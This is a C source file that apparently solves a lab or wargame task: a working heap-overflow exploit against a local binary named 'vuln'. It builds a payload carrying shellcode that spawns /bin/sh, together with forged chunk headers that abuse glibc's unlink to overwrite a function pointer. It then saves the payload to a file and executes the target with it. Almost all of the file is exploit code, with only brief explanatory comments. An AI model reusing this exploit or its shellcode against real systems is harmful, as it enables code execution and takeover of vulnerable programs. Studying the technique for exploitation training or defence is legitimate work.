#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define FUNCTION_POINTER ( 0x08049778 ) 
#define CODE_ADDRESS ( 0x804a008 + 0x10 )

#define	VULNERABLE "./vuln"
#define DUMMY 0xdefaced

char shellcode[] =
        "\xeb\x0assppppffff"
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main( void )
{
        char * p;
        char argv1[ 680 + 1 ];
        char * argv[] = { VULNERABLE, argv1, NULL };
	FILE * f = NULL;

        p = argv1;
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* Copy the shellcode */
        memcpy( p, shellcode, strlen(shellcode) );
        p += strlen( shellcode );
        /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize of first chunk */
        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );
        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );
        /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */
        *( (size_t *)p ) = (size_t)( 0xffffffff );
        p += 4;
        /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/
        *( (size_t *)p ) = (size_t)( -4 );
        p += 4;
        
	*( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );
        p += 4;
        *( (void **)p ) = (void *)( CODE_ADDRESS );
        p += 4;
        /* the terminating NUL character */
        *p = '\0';

	f = fopen("input_str.txt", "w");
	fprintf(f, "%s", argv1);
	fclose(f);

        /* the execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}
